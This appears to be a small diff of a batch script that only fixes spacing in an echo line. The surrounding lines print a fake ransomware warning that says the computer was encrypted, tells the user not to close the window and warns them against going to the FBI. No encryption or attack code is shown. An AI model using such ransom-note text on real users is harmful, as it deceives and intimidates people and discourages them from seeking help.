@@ -110,7 +110,7 @@ pause
 echo ***WARNING:*** 
 echo %name%, I'm sorry but this computer was compromised and encrypted by Ransomware!
 echo **********WARNING**********
-echo%name% DO NOT:
+echo %name% DO NOT:
 echo Close this window or back out of this program, you must move forward, to retrieve the key and get your information back. 
 echo **********WARNING**********
 echo Your information has been compressed and archived to the cloud. Don't try anything stupid like going to the FBI.
